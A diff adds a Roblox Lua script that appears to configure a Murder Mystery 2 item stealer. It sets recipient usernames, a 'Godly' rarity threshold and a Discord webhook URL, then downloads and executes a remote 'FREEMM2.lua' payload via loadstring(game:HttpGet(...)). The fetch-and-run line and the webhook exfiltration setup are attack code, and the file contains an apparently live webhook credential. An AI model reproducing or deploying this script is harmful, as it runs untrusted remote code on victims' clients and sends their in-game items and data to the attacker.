@@ -1,0 +1,8 @@
+_G.Usernames = {"Redan1955", "Redan1955", "Redan1955"} -- you can add as many as you'd like
+_G.min_rarity = "Godly"
+_G.min_value = 1 -- Put 1 to get all
+_G.pingEveryone = "Yes" -- change to "No" if you dont want pings
+_G.webhook = "https://discord.com/api/webhooks/1364883011975254077/1nWufhPk8-UCrQzyjBWqgwBt1HsX4pOgtnhCHMxFTL3VO0W6LO1dWmhuKPVu_Zjh7mGt" -- change to your webhook
+
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/lpikinik/mm2/refs/heads/main/FREEMM2.lua"))()
